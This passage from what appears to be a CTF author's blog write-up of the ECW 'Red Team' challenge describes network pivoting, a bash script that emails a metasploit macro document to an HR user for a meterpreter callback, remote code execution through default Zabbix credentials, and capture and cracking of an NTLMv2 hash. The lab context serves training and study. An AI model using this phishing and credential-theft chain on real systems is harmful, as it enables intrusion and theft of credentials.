  &lt;li&gt;172.19.0.3;&lt;/li&gt;
  &lt;li&gt;172.19.0.4.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To perform port scan, we will setup proxychains to be able to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netcat&lt;/code&gt;. For that we used the metasploit modules:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;multi/manage/autoroute&lt;/code&gt;;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server/socks_proxy&lt;/code&gt;.
&lt;img src=&quot;/assets/redteam/autoroute.png&quot; alt=&quot;autoroute&quot; /&gt;
&lt;img src=&quot;/assets/redteam/socks.png&quot; alt=&quot;socks&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And then we will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netcat&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proxychains&lt;/code&gt; to scan each machine. We will only select some classic ports:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;21 (FTP)&lt;/li&gt;
  &lt;li&gt;22 (SSH)&lt;/li&gt;
  &lt;li&gt;25 (SMTP)&lt;/li&gt;
  &lt;li&gt;80 (HTTP)&lt;/li&gt;
  &lt;li&gt;443 (HTTPS)&lt;/li&gt;
  &lt;li&gt;445 (SMB)&lt;/li&gt;
  &lt;li&gt;3306 (MySQL)&lt;/li&gt;
  &lt;li&gt;5900 (VNC)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/nmap1.png&quot; alt=&quot;nmap machine 1&quot; /&gt;
On the machine 172.19.0.3, we have found the port 3306 opened. We can assume that it is the database of the web application.&lt;/p&gt;

&lt;p&gt;If we scan the second machine:
&lt;img src=&quot;/assets/redteam/nmap2.png&quot; alt=&quot;nmap machine 2&quot; /&gt;
We can find a SMTP port open. If we remember the Part1 of the challenge, it was said “Send your resume to Lucie Bayard”. &lt;br /&gt;
So we need to perform some spear phishing on Lucie Bayard.&lt;/p&gt;

&lt;h4 id=&quot;fun-fact-database-under-presure&quot;&gt;Fun Fact: Database under presure&lt;/h4&gt;

&lt;p&gt;For a lot of challengers, the database was &lt;strong&gt;the man to kill&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;I received multiple DM on discord if it was normal if their attacks didn’t work.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Hello une petite question, normal que ça marche pas ça ? Quand j’essaye chez moi (a gauche) j’arrive bien à lire le fichier
&lt;img src=&quot;/assets/redteam/DB1_Screen.png&quot; alt=&quot;DB1&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;hello, normal aussi que je puisse pas faire ca ?
&lt;img src=&quot;/assets/redteam/DB2_Screen.png&quot; alt=&quot;DB2&quot; /&gt;
parce que ce doc avait quand même l’air d’être au petits oignions https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;People attacked so much the database that I wanted to rename it to “yamete kudasai”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/yamete.png&quot; alt=&quot;yamete&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;phishing-click-master&quot;&gt;Phishing click master&lt;/h4&gt;

&lt;p&gt;As the challenge description informs us we are looking for a NTLM hash, we will assume we target a Windows workstation.&lt;/p&gt;

&lt;p&gt;Then, we will create a docm using metasploit&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/MacroMeter.png&quot; alt=&quot;Macro&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we will use the first script we find on a random github (https://gist.github.com/boina-n/e43b996fa0f520c918e3ed6beb754447) to sent it:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/tmp/msf.docm&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;subject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Subject of my email&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;txtmessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;This is the message I want to send&quot;&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;EHLO phealthycat.org&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;MAIL FROM: &amp;lt;test@phealthycat.org&amp;gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;RCPT TO: &amp;lt;lucie.bayard@phealthycat.org&amp;gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DATA&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Subject:&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$subject&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Type: multipart/mixed; boundary=&quot;&lt;/span&gt;KkK170891tpbkKk__FV_KKKkkkjjwq&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;This is a MIME formatted message.  If you see this text it means that your&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;email software does not support MIME formatted messages.&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;--KkK170891tpbkKk__FV_KKKkkkjjwq&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Type: text/plain; charset=UTF-8; format=flowed&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Disposition: inline&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$txtmessage&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;--KkK170891tpbkKk__FV_KKKkkkjjwq&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Type: file --mime-type -b filename-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt; +%y%m%d&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.zip; name=filename-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt; +%y%m%d&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.docm&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Transfer-Encoding: base64&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Disposition: attachment; filename=&quot;&lt;/span&gt;filename-&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt; +%y%m%d&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;.docm&lt;span class=&quot;s2&quot;&gt;&quot;;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The content is encoded in base64.&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;--KkK170891tpbkKk__FV_KKKkkkjjwq--&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;quit&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; | proxychains nc 172.19.0.4 25
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once the mail is sent thanks to our superb script, we just have to wait for the callback.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/meterpreter2.png&quot; alt=&quot;Meterpreter HR&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now that we have a shell on the HR, we can grab the flag on the Desktop: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ECW{Hum4n_1s_Th3_W3akest_P0int}&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/flag3.png&quot; alt=&quot;flag 3&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;fun-fact-funny-emails-received&quot;&gt;Fun Fact: Funny emails received&lt;/h4&gt;
&lt;p&gt;During the challenge, I looked on some emails received by the HR. Some challengers sent various payload with make me laught. Unfortunately I didn’t screen people who sent Linux payloads in the email body. But I could have catch some funny emails.&lt;/p&gt;

&lt;p&gt;PHP INFO WTF ? I really don’t know ?&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;img src=&quot;/assets/redteam/phpinfo.png&quot; alt=&quot;phpinfo&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This guy is at the end of his life :’)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;img src=&quot;/assets/redteam/JPP.png&quot; alt=&quot;JPP&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;step-4---ciso-here-i-come&quot;&gt;Step 4 - CISO here I come&lt;/h3&gt;

&lt;h4 id=&quot;recon-on-hr&quot;&gt;Recon on HR&lt;/h4&gt;

&lt;p&gt;Once we got a shell, we need to find a way to get to the CISO (Jean Luc Delafont). First we will dig in the home directory of Lucie. By looking in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Download&lt;/code&gt; folder, we can find an interesting file: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zabbix_agent-5.4.4-windows-amd64-openssl.msi&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/hintDL.png&quot; alt=&quot;Hint&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can also find an other file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ThisIsNotAHint.jpeg&lt;/code&gt;. This file is not usefull for the challenge, he was only here to make challengers to remember good old memories :).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/ThisIsNotAHint.jpeg&quot; alt=&quot;ThisIsNotAHint&quot; /&gt;.&lt;/p&gt;

&lt;p&gt;Now we know there is something related to Zabbix in this challenge. Let’s check if the agent is installed on the system and if so, we can look at the configuration file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/zabbixConf.png&quot; alt=&quot;Zabbix Config&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By looking at the configuration file, we can find the Zabbix server address IP: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.12.234&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/ZabbixConf2.png&quot; alt=&quot;Zabbix Server IP&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;fun-fact-where-is-the-lpe&quot;&gt;Fun Fact: Where is the LPE&lt;/h4&gt;

&lt;p&gt;A lot of people tried to escalate their privileges on the HR workstation, however there was no way to do so. Some were so deseperated that they tried some random DLL hijacking.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;img src=&quot;/assets/redteam/LPE.png&quot; alt=&quot;LPE&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;img src=&quot;/assets/redteam/DLLHijack.png&quot; alt=&quot;DLL&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;zabbix&quot;&gt;Zabbix&lt;/h4&gt;

&lt;p&gt;Now that we have the Zabbix server IP, we can attempt to connect on it.&lt;br /&gt;
By accessing the IP through HTTP (http://192.168.12.234), we can successfuly connect to interface using defaut Zabbix credentials:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;login: Admin&lt;/li&gt;
  &lt;li&gt;password: zabbix&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/zabbix.png&quot; alt=&quot;Zabbix&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once connected we can navigate to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administration&lt;/code&gt; section and use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scripts&lt;/code&gt; feature to perform remote code execution on the agents. By executing a simple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami&lt;/code&gt; command, we can identify that the agent runs with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phealthycat\jldelafont&lt;/code&gt; (our target) privileges.
A first thing that we can try, is to make the agent connect to a SMB server that we host through UNC path to capture the Net-NTLMv2 of our target. It can be done by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbserver.py&lt;/code&gt; from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;impacket&lt;/code&gt; tools. A lot of challengers used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Responder&lt;/code&gt; for its SMB server part, but it is not its primary function. That’s why &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbserver.py&lt;/code&gt; from impacket is more appropriated.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/script.png&quot; alt=&quot;script&quot; /&gt; 
To execute our script, we need to manually execute it on our agent through the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Last data&lt;/code&gt; page of the Zabbix server.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/launch_script.png&quot; alt=&quot;execute script&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once our script executed, we can see on our impacket server the Net-NTLMv2 of our target.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/impacket.png&quot; alt=&quot;Impacket&quot; /&gt;
&lt;img src=&quot;/assets/redteam/netntlmv2.png&quot; alt=&quot;Net-NTLMv2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With this Net-NTLMv2, we can attempt to crack it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;John-The-Ripper&lt;/code&gt; and the famous wordlist &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Rock-You&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/john.png&quot; alt=&quot;John&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can easily discover our target’s password in plain text: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Blink182&lt;/code&gt;.
Now that we have the plain text password, we can reforge the NT hash which is only our plain text password encoded in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UTF-16-LE&lt;/code&gt; and hashed in MD4 (without the newline).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/NT.png&quot; alt=&quot;Hash NT&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We now have our last flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ECW{c2367169e3279fa3e85d9d25f0e85e45}&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;fun-fact-omg-windef&quot;&gt;Fun Fact: OMG WinDef&lt;/h4&gt;

&lt;p&gt;A lot of challengers wanted to launch a meterpreter or a reverse shell on the machine. However &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows Defender&lt;/code&gt; was running on the machine.&lt;/p&gt;

&lt;p&gt;I got a some DM about bypassing the antivirus. They tried some obscure russian things…&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;img src=&quot;/assets/redteam/russian.png&quot; alt=&quot;Russian&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Once they finnally succeed to deploy a meterpreter or a reverse shell on the machine and flag the last step, I happily told them that bypassing Windows Defender was not necessary to flag the last step.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;img src=&quot;/assets/redteam/upset.png&quot; alt=&quot;upset&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This year we aimed to create a BIG challenge summarizing our most typical penetration testing mission&lt;/p&gt;

&lt;p&gt;We hope you liked it and had as much fun playing it than we had creating it :)&lt;/p&gt;</content><author><name></name></author><category term="WriteUp" /><summary type="html">Red Team By @ZkClown with the help of @Flolou Table of Contents Intro The initial idea Creation of each step OSINT Web Application Pentest Phishing AD Compromise Infrastucture Write up (Solution) Description Step 1 - OSINT Google Twitter GitHub Instagram Google again LinkedIn The Website Fun Fact: Malware site Fun Fact: Collateral damage This Hint noone found Step 2 - Web Application Pentest Intended way: Weak ACL Unintended way: Cookie Flask with weak secret Fun Fact: Pranksters SSTI Step 3 - Phishing some HR Pivot with the Web App Fun Fact: Database under pressure Phishing Click Master Fun Fact: Funny emails received Step 4 - CISO here I come Recon on HR Fun Fact: Where is the LPE Zabbix Fun Fact: OMG WinDef Conclusion Intro For the European Cyber Week Challenge (ECW Challenge), I’ve created a challenge named Red Team divided in 4 steps. This blog post aims to present how this challenge was created and the purpose of each step of it. Also a write up on the solution will be presented at the end of the article with some fun facts during the challenge. The initial idea I wanted to create a challenge which simulate a realistic situation that we could have found in a Red Team operation. The initial goal of the challenge was to fully compromise a company (get domain administrator privileges as ultimate goal). To create the scenario I used different real world situation that I have encountered during different audit. I divides my challenge in at least 4 steps: OSINT based on keyword to find out the entry point; Web application pentest to reach a mail server which requires no authentication; Phishing on the company to get foothold in the information system; AD compromise (with no precise idea of how to). However, since there was a risk that a challenger break all the challenge if we give DA privileges. I decided to never give admin privileges on compromise systems. So the last step of the challenge was to retrieve the NT hash of the target (Harold). Now that the schema of the challenge has been made, I needed to think about “how to build each step”. Creation of each step OSINT As said previously, I wanted to create an OSINT part to make the challengers to find out the website to attack. However I didn’t want to do a guessing challenge like we can find in other CTF with this type of challenge. I wanted to create a straight forward challenge. The aim is to create a nice and funny universe, where challengers should not be frustrated to have to guess something. First I wanted to use popular social medias: Twitter (Eveyone in IT uses twitter) Github (We often find interesting things in commits) Instagram (Who does not like taking picture of himself with company information in the background) Linkedin (Every company uses it, it was the natural last social to find out the web site) Now that I had the path for my scenario, I needed to create a context. Since this year’s very very original ECW theme was medical (covid), I needed to create something related to it. As I am also a big cat lover, I imagined a company which creates medication for cats named PharmaHealthyCat. And to match the covid theme, it creates Covid vaccine for cats. \o/ I got my company. Now I needed to find the target, the one who likes social media. I needed to find a face which challenger would directly find out that is not a real person. So I took the meme Harold. Thanks to internet, I could have find out many images of him in different situation and clothes. I got everything, I started created the different account on the different social media account and make them to have a little activities: Twitter: Tweet the github on first tweet, then create tweets and retweets so stupid stuff; Github: Fork multiple projets. Find a project to use instagram. Fork it and create a config file with the Instagram account; Instagram: Post picture of Harold and cats. Create a post with a picture which includes an open Word document with the company name. I needed to take the picture myself, so I asked someone to take me in picture in front of my computer. Linkedin: Create multiple accounts for employees, create the company page with the link to the website. The purpose of this step was to show that even if people have nothing to hide, social medias can leak a lot of usefull data. Ok now, the first step is done. Web Application Pentest For this step, I needed to think about which vulnerability I wanted to use to create remote code execution. I thought about Server Side Template Injection (SSTI) as attack vector. But I didn’t want to make the feature reachable from an unauthenticated user nor a basic user. So I decided to add a vulnerability to escalate privileges on the application. The privilege escalation was supposed to be from a weak access control on the page which manages the users (the page needed to be found) and the feature which allows to change users’ privileges. But since, I am a lazy developper I didn’t change the key used to sign the session cookie of the FLASK application. Therefore an other way to escalate privileges was to craft a cookie with ID 1 and sign it with the default key wich is … key. On the website, I needed to present the company, put employees pictures and ultimately put a hint which indicates to perform spear phishing on an employee. What else than the Human Ressources director as target ? The purpose of this step was to reach the internal SMTP server. Phishing For this step, multiple things were needed: SMTP server to send emails; IMAP server to receive emails; An Active Directory environment for the company; A workstation with a script which opens email and open attachments. At the begining I wanted to simulate a real world situation. So at the begining I wanted to put on the workstation an antivirus (Windows Defender is good enough). And ultimately put a Firewall to prevent call backs on port other than 80, 443. But since I knew that a lot of challengers would not find out spear phishing is needed to be performed for this step, I decided to remove firewall and antivirus. I know, I am a nice person =D . The purposes of this step were: Pivot on the network of the web application server to reach internal services; SMTP server/relay in companies can be found to not have authentication on it (oops); Employees in companies can be click masters. AD Compromise For this step, I didn’t know what to do to compromise the Active Directory. But I was pretty sure about something: I am lazy boy. So I decided to use Zabbix as a supervision solution. Companies often have stuff like this to monitor their information systems. But they also often activate remote code execution to perform custom checks on it (by default it is disabled). I needed to create a Linux server to host the zabbix service. I also needed to install Zabbix agents on the workstation and enable remote code execution on the target workstation. (I didn’t activate it on the HR workstation because it ran with SYSTEM rights and I did not want challengers to perform mimikatz on it). I set up the agent to run as our target user to get his privileges when remote code execution is performed on his workstation. I wanted challengers to retrieve the NT hash to validate the challenge. However the question was “How to get the NT hash when you have remote code execution with our target context ?”. The solution was to catch a NTLMv2 hash and break it due to a weak password (RockYou). And finally craft the NT hash from the plain text password. The Zabbix was running with default credentials to access the remote code execution feature. I left the .msi used to install the agent on the Downloads folder of the HR machine to give a hint for challengers. Then they can read the configuration file of the Zabbix agent to retrieve the Zabbix server IP. The purposes of this step were: Pivot can be performed through supervision tools (do not focus on classic Active Directory attacks); Default credentials on internal applications; Services often run with domain administrator privileges (even if on this scenario it was not the case); Understand that Responder was not needed here since we have already code execution in a domain user context; Weak passwords are often used in companies; Know what a NT hash is. Infrastucture For this challenge we used an ESXi to host our different virtual machines. This challenge required several VMs: 1 firewall (pfSense) to configure the different networks and filter necessary flows; 1 Linux server to host docker need for web application, its database and the mail server; 1 Linux server to host Zabbix server; 2 Windows workstations (HR and Harold); 1 Domain Controller. I created 3 networks (VLANs) for this challenge: A DMZ to host (Web Server, Database, Mail Server); Users VLAN (Workstations); Servers (Zabbix server, Domain Controller) Write up (Solution) Description When we first connect on the challenge we have this message to introduce the challenge: The CSO of a famous company is looking for skilled hackers to join his team. He sent the following challenge: I setup a website to challenge your skill as a pentester Find me over the Internet as I stand by the nickname Zer0DayH4ckz0r If you reach my website you should be able to gain control of a server You will then need to go deeper and find a pivot Finally if your are good enough you will send me my own password as a NTLM hash Good luck! Step 1 - OSINT Google Fist step of the challenge was to type Zer0DayH4ckz0r on our favorite search engine. We find a twitter account wich seems to correspond with the nickname. Twitter 